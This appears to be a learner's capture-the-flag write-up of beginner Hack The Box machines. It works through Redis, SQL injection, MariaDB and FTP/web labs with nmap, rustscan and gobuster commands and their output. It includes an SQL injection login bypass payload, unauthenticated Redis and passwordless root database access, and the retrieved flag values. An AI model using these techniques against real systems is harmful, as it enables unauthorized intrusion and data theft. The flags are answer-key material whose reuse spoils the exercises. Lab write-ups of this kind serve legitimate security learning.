- Recon'
 - rustscan -a 10.129.175.13  --range 1009-65535 [link](https://github.com/RustScan/RustScan/wiki/Usage) 
 - redis is no-memory Database type
 - Which flag is used with the Redis command-line utility to specify the hostname? (-h)
 - Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server? (`info`)
 - What is the version of the Redis server being used on the target machine? (`nmap -sC -sV -p 6379 $IP`)
 - Which command is used to select the desired database in Redis? (`select` )
 - How many keys are present inside the database with index 0? (`4`) how ? : 
 
 ```bash
 #Install redis
 
curl -fsSL https://packages.redis.io/gpg | sudo gpg --dearmor -o /usr/share/keyrings/redis-archive-keyring.gpg

echo "deb [signed-by=/usr/share/keyrings/redis-archive-keyring.gpg] https://packages.redis.io/deb $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/redis.list

sudo apt-get update
sudo apt-get install redis

#use redis cli 
redis-cli -h $IP -p 6379 
10.129.175.13:6379> SELECT 0
OK
10.129.175.13:6379> DBSIZE
(integer) 4
(2.13s)
10.129.175.13:6379>
```  
- Which command is used to obtain all the keys in a database? (`keys *`)
- Submit root flag 
 ```bash
10.129.175.13:6379> keys *
1) "stor"
2) "numb"
3) "flag"
4) "temp"
10.129.175.13:6379> keys flag
1) "flag"
10.129.175.13:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
10.129.175.13:6379> 

```

Redeemer Finish 
Also **Tier 0** Free machines finish
## -------------------------------------------------------

### Tier 1 Free machines

## Appointment (Very Easy)

- What does the acronym SQL stand for? (`Structured Query Language`)
- What is one of the most common type of SQL vulnerabilities? (`sql injection`)
- What is the 2021 OWASP Top 10 classification for this vulnerability? (**[A03:2021-Injection)
 - What does Nmap report as the service and version that are running on port 80 of the target? : (`Apache httpd 2.4.38 ((Debian))`) 
    ```bash
    nmap -sC -sV -p 80 10.129.121.152 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-14 16:03 SAST
Nmap scan report for 10.129.121.152
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds
```

- What is the standard port used for the HTTPS protocol? (`443`)
- What is a folder called in web-application terminology? (`directory`)
- What is the HTTP response code is given for 'Not Found' errors? (`404`)
- Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?(`dir`)
- What single character can be used to comment out the rest of a line in MySQL?(`#`)
- If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned? (`congratulations`) - > ```
admin
1' or 1=1;#
[link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-error-based) 
- Submit root flag : previous answer





## --------------------------------------------------------
### Tier 1 Free machines
## Sequel (Very Easy)

- During our scan, which port do we find serving MySQL? (`3306`)
 ```bash
 nmap -sC -sV 10.129.8.9 
```
- What community-developed MySQL version is the target running? (`MariaDB`)
- When using the MySQL command line client, what switch do we need to use in order to specify a login username?(`u`)
 Ex : `mariadb -h 166.78.144.191 -u username -ppassword database_name` 
- Which username allows us to log into this MariaDB instance without providing a password? (`root`)
- In SQL, what symbol can we use to specify within the query that we want to display everything inside a table? (`*`)
- In SQL, what symbol do we need to end each query with? (`;`)
- There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?(`htb`)
```bash
mariadb -h 10.129.8.9 -u root -p 
Enter password: #Blank password here
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 74
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.106 sec)

```

- Submit root flag : 
 ```bash
 USE htb;
 MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+

```


## -------------------------------------------------------
## Crododile

   
- What Nmap scanning switch employs the use of default scripts during a scan? (`-sC`)
- What service version is found to be running on port 21? (`vsftpd 3.0.3`)
- What FTP code is returned to us for the "Anonymous FTP login allowed" message?(`230`)
- After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously? (`anonymous`)
- After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server? (`get`)
- What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server? (`admin`)
- What version of Apache HTTP Server is running on the target host? (`Apache httpd 2.4.41)
- What switch can we use with Gobuster to specify we are looking for specific filetypes?(`-x`)
- Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service? (`login.php`)
  ```bash
  gobuster dir -u http://10.129.85.115 -w common.txt  -x php    
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.85.115
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/12/15 15:29:23 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 315] [--> http://10.129.85.115/assets/]
Progress: 794 / 3886 (20.43%)[ERROR] 2023/12/15 15:29:47 [!] Get "http://10.129.85.115/album.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/config.php           (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 312] [--> http://10.129.85.115/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.85.115/js/]
/login.php            (Status: 200) [Size: 1577]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
[ERROR] 2023/12/15 15:30:36 [!] Get "http://10.129.85.115/java.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 2448 / 3886 (63.00%)[ERROR] 2023/12/15 15:30:41 [!] Get "http://10.129.85.115/lifestyle": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3368 / 3886 (86.67%)[ERROR] 2023/12/15 15:30:59 [!] Get "http://10.129.85.115/setting": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3394 / 3886 (87.34%)[ERROR] 2023/12/15 15:30:59 [!] Get "http://10.129.85.115/shared.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3884 / 3886 (99.95%)
===============================================================
2023/12/15 15:31:10 Finished
===============================================================

```